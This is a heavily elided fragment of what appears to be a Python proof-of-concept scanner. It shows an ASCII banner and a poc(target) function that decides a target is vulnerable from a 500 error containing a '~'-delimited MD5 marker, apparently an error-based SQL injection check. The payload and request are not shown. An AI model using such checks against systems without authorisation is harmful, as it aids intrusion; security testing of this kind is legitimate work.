...
def banner():
    test = """                                                            
        .__           .__       .__                       
|  |__ _____  |__|__  __|__|____    ____    ____  
|  |  \\__  \ |  \  \/  /  \__  \  /    \  / ___\ 
|   Y  \/ __ \|  |>    <|  |/ __ \|   |  \/ /_/  >
|___|  (____  /__/__/\_ \__(____  /___|  /\___  / 
     \/     \/         \/       \/     \//_____/ 
          version = 1.0         
"""
    print(test)
...
def poc(target):
    ...
    try:
        ...
        if response.status_code == 500:
            match = re.search(r'~(.*?)&#39',response.text,re.S)
            if match.group(1) in 'e10adc3949ba59abbe56e057f20f883&#39':
